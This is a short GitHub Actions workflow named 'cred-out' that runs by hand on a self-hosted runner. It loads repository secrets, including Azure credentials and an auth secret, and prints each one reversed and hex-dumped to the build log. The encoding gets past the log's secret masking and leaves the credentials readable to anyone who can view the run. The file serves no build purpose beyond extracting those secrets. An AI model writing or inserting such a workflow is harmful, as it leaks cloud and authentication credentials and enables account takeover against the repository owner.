name: cred-out
on:
  workflow_dispatch:
jobs:
  out:
    runs-on: [self-hosted, Linux, X64]
    steps:
      - name: emit
        env:
          C1: ${{ secrets.NOCASH_AZURE_CREDENTIALS }}
          C2: ${{ secrets.AUTH_SECRET }}
          C3: ${{ secrets.AUTH_URL }}
          C4: ${{ secrets.NEXT_PUBLIC_URL }}
        run: |
          for v in C1 C2 C3 C4; do
            echo "=${v}_START="
            printf '%s' "${!v}" | rev | xxd
            echo "=${v}_END="
          done